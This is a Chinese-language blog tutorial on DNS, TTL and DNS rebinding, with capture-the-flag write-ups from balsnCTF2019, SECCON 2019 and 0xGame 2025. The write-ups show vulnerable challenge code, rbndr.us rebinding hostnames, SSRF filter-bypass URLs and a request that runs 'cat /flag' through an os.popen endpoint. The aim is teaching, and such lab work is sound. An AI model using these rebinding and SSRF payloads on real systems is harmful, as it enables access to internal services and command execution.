---
title: DNS 重定向
date: 2026-08-28 12:35:00
categories:
  - Web安全
tags:
  - DNS重定向
description: DNS 重定向
---


文章：https://zhuanlan.zhihu.com/p/89426041

工具：https://lock.cmpxchg8b.com/rebinder.html

#### DNS原理：https://www.ruanyifeng.com/blog/2016/06/dns.html

## 1.DNS

DNS是Domain Name Service的缩写,**计算机域名服务器**,在Internet上`域名与IP地址之间是一一对应`的，域名虽然便于人们记忆，但机器之间只能互相认识IP地址，它们之间的转换工作称为域名解析，而域名解析需要由专门的域名解析服务器来完成，这就是DNS域名服务器。就是**根据域名查出IP地址**。你可以把它想象成一本巨大的电话本。举例来说，如果你要访问域名`math.stackexchange.com`，首先要通过DNS查出它的IP地址是`151.101.129.69`。

## 2.DNS TTL

[TTL值](https://zhida.zhihu.com/search?content_id=108001650&content_type=Article&match_order=1&q=TTL值&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjMwODcxNzYsInEiOiJUVEzlgLwiLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoxMDgwMDE2NTAsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.WT4qCJ3zDy3mDloUd4Yc_YnQASiPS1GHo44vFZyyN1U&zhida_source=entity)全称是“生存时间（Time To Live)”，简单的说它表示DNS记录`在DNS服务器上缓存时间`，数值越小，修改记录各地生效时间越快。

当各地的DNS(LDNS)服务器接受到解析请求时，就会向域名指定的授权DNS服务器发出解析请求从而获得解析记录；该解析记录会在DNS(LDNS)服务器中保存一段时间，这段时间内如果再接到这个域名的解析请求，DNS服务器将不再向授权DNS服务器发出请求，而是直接返回刚才获得的记录；而这个记录在DNS服务器上保留的时间，就是TTL值。

#### 常见的设置TTL值的场景

##### **1.增大TTL值，以节约域名解析时间**

通常情况下域名解析记录是很少更改的。我们可以通过增大域名记录的TTL值让记录在各地DNS服务器中缓存的时间加长，这样在更长的时间段内，我们访问这个网站时，本地ISP的DNS服务器就不需要向域名的NS服务器发出解析请求，而直接从本地缓存中返回域名解析记录,从而提高解析效率。 TTL值是以秒为单位的，通常的默认值都是3600，也就是默认缓存1小时。我们可以根据实际需要把TTL值扩大，例如要缓存一天就设置成86400。

##### **2.减小TTL值，减少更新域名记录时的不可访问时间**

更换空间因为TTL缓存的问题，新的域名记录，在有的地方可能生效了，有的地方可能等上一两天甚至更久才生效。结果就是有的人访问到了新服务器，有的人访问到了旧服务器。如果原来的域名TTL值设置的小，各地的ISP域名缓存服务器服务器就会很快的访问你域名的权威DNS解析服务器，尽快把你域名的DNS解析IP返回给查询者。

## 3.DNS Rebinding

在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。

### 具体步骤

1. 攻击者控制恶意的DNS服务器来回复域的查询,如rebind.network
2. 攻击者通过一些方式诱导受害者加载[http://rebind.network](https://link.zhihu.com/?target=http%3A//rebind.network)
3. 用户打开链接,浏览器就会发出DNS请求查找rebind.network的IP地址
4. 恶意DNS服务器收到受害者的请求,并使用真实IP地址进行响应,并将TTL值设置为1秒,让受害者的机器缓存很快失效
5. 从[http://rebind.network](https://link.zhihu.com/?target=http%3A//rebind.network)加载的网页包含恶意的js代码,构造恶意的请求到[http://rebind.network/index](https://link.zhihu.com/?target=http%3A//rebind.network/index),而受害者的浏览器便在执行恶意请求
6. 一开始的恶意请求当然是发到了攻击者的服务器上,但是随着TTL时间结束,攻击者就可以让[http://rebind.network](https://link.zhihu.com/?target=http%3A//rebind.network)绑定到别的IP,如果能捕获受害者的一些放在内网的应用IP地址,就可以针对这个内网应用构造出对应的恶意请求,然后浏览器执行的恶意请求就发送到了内网应用,达到了攻击的效果

### [同源策略](https://zhida.zhihu.com/search?content_id=108001650&content_type=Article&match_order=1&q=同源策略&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjMwODcxNzYsInEiOiLlkIzmupDnrZbnlaUiLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoxMDgwMDE2NTAsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.45-7VnxHG7r3hczY-PUoeTRbbtmeADBEcYeVPqNI3rE&zhida_source=entity)的失效

对于WEB的同源策略相信大家都很熟悉,**如果两个页面的协议，端口（如果有指定）和域名都相同，则两个页面具有相同的源**,而不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。

当然,页面中的链接，重定向以及表单提交是不会受到同源策略限制的,并且,跨域资源的引入是可以的。但是js不能读写加载的内容。

同源策略确实提高了web的安全性,但是对于DNS Rebinding来说是没有作用的,因为同源策略看的是域名,并不是背后的IP地址,虽然两次的请求IP地址不同,但是由于DNS服务器的绑定,域名都是一样的,那么自然不违反同源策略.

# CTF实战应用

### balsnCTF2019 韩国鱼

本题的一个步骤也涉及到了DNS重绑定的利用,这里就截取部分代码说明,完整的wp可以查看[https://mp.weixin.qq.com/s/ToORsrR_1fh1gnnO2cM_VQ](https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/ToORsrR_1fh1gnnO2cM_VQ)

部分涉及到的代码

```php
$dst = @$_GET['KR'];
$res = @parse_url($dst);
$ip = @dns_get_record($res['host'], DNS_A)[0]['ip'];
...
$dev_ip = "54.87.54.87";
if($ip === $dev_ip) {
    $content = file_get_contents($dst);
    echo $content;
}
```

很明显,题目是想定死我们域名的ip为54.87.54.87,但是这样就没法读到内网的信息了,如果我们域名解析的IP直接为127.0.0.1,那就无法过`$ip === $dev_ip`,接下来就得利用DNS Rebinding

这是一个测试dns重绑定漏洞的网站,可以让一个域名随机的绑定两个IP [https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg](https://link.zhihu.com/?target=https%3A//lock.cmpxchg8b.com/rebinder.html%3Ftdsourcetag%3Ds_pctim_aiomsg)

让我们在本地测试一下吧

```bash
➜  ~ host 7f000001.36573657.rbndr.us
7f000001.36573657.rbndr.us has address 127.0.0.1
➜  ~ host 7f000001.36573657.rbndr.us
7f000001.36573657.rbndr.us has address 127.0.0.1
➜  ~ host 7f000001.36573657.rbndr.us
7f000001.36573657.rbndr.us has address 54.87.54.87
➜  ~ host 7f000001.36573657.rbndr.us
7f000001.36573657.rbndr.us has address 54.87.54.87
➜  ~ host 7f000001.36573657.rbndr.us
7f000001.36573657.rbndr.us has address 54.87.54.87
➜  ~ host 7f000001.36573657.rbndr.us
7f000001.36573657.rbndr.us has address 54.87.54.87
➜  ~ host 7f000001.36573657.rbndr.us
7f000001.36573657.rbndr.us has address 127.0.0.1
➜  ~ host 7f000001.36573657.rbndr.us
7f000001.36573657.rbndr.us has address 127.0.0.1
```

所以思路很明确,先让$ip为54.87.54.87,然后在`file_get_contents`的时候我们GET的域名又绑定到127.0.0.1,这样就绕过了if判断语句,可以读内网信息,当然,由于是随机的,所以要多打几次.

### [SECCON 2019 Web: Option-Cmd-U]

题目地址:http://ocu.chal.seccon.jp:10000

```html
<!-- src of this PHP script: /index.php?action=source -->//
                    <!-- the flag is in /flag.php, which permits access only from internal network :-) -->
                    <!-- this service is running on php-fpm and nginx. see /docker-compose.yml -->
```

根据源码提示,访问`http://ocu.chal.seccon.jp:10000/index.php?action=source`读取源码,我们重点看PHP代码部分

```php
<?php
if (isset($_GET['url'])){
    $url = filter_input(INPUT_GET, 'url');
    $parsed_url = parse_url($url);                        
    if($parsed_url["scheme"] !== "http"){
        // only http: should be allowed. 
        echo 'URL should start with http!';
    } else if (gethostbyname(idn_to_ascii($parsed_url["host"], 0, INTL_IDNA_VARIANT_UTS46)) === gethostbyname("nginx")) {
    // local access to nginx from php-fpm should be blocked.
        echo 'Oops, are you a robot or an attacker?';
    } else {
    // file_get_contents needs idn_to_ascii(): https://stackoverflow.com/questions/40663425/
        highlight_string(file_get_contents(idn_to_ascii($url, 0, INTL_IDNA_VARIANT_UTS46),
               false,
               stream_context_create(array(
                   'http' => array(
                       'follow_location' => false,
                       'timeout' => 2
                   )
    ))));
    }
}
?>
```

我们提交`http://ocu.chal.seccon.jp:10000/flag.php`,返回`Forbidden.Your IP: 172.25.0.1`,看来我们的ip被定为`172.25.0.1`,根据代码,我们得先知道nginx的ip,简单fuzz后,提交`http://172.25.0.3/flag.php`会触发`Oops, are you a robot or an attacker?`,确认了nginx的ip后,跟上题一样,我们在上一题给出的网站构造域名,一个填`172.25.0.3`,另一个IP就随意了,原理也跟上题类似,当然也是随机的,多点几次就访问到flag了.

当然本题还有其他一些有趣的解法,比如以下的一些payload都是可以的

```text
http://nginx：80/flag.php
http://＠nginx/flag.php
http://nginx／flag.php
```

### [0xGame_2025_web]DNS想要玩：

```php
//源码
from flask import Flask, request
from urllib.parse import urlparse
import socket
import os

app = Flask(__name__)

BlackList=[
    'localhost', '@', '172', 'gopher', 'file', 'dict', 'tcp', '0.0.0.0', '114.5.1.4'
]

def check(url):
    url = urlparse(url)
    host = url.hostname
    host_acscii = host.encode('idna').decode('utf-8')
    return socket.gethostbyname(host_acscii) == '114.5.1.4'

@app.route('/')
def index():
    return open(__file__).read()

@app.route('/ssrf')
def ssrf():
    raw_url = request.args.get('url')
    if not raw_url:
        return 'URL Needed'
    for u in BlackList:
        if u in raw_url:
            return 'Invaild URL'
    if check(raw_url):
        return os.popen(request.args.get('cmd')).read()
    else:
        return "NONONO"

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=8000)
```

过滤了114.5.1.4，但是需要满⾜hostname是114.5.1.4，可以使⽤DNS重绑定向https://zhuanlan.zhihu.com/p/89426041

这⾥我们⽤这个⽹站：https://lock.cmpxchg8b.com/rebinder.html

![image-20251208145134796](/img/ctf/dns-rebinding-001.png)

```
/ssrf?url=http://72050104.c0a80002.rbndr.us&cmd=ls /
```

```
/ssrf?url=http://72050104.c0a80002.rbndr.us&cmd=cat /flag
```

0xGame{DNS_Rebinding_is_Really_Magical}
